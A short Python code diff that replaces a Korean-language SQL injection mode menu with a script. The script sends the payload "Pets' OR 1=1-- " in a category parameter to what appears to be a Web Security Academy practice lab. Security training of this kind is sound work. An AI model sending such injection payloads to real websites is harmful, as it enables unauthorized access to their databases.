@@ -1,14 +1,13 @@
-from boolean_sqli import run_boolean
-from union_sqli import run_union
+import requests
 
-url = input("URL 입력: ")
-mode = input("모드 선택 (boolean / union): ")
+url = "https://0afa00b904241260806d807f0014006c.web-security-academy.net/filter?"
 
-if mode == "boolean":
-    run_boolean(url)
+payload = "Pets' OR 1=1-- "
 
-elif mode == "union":
-    run_union(url)
+params = {
+    "category": payload
+}
 
-else:
-    print("잘못된 모드입니다")
+res = requests.get(url, params=params)
+
+print(res.text[:1000])
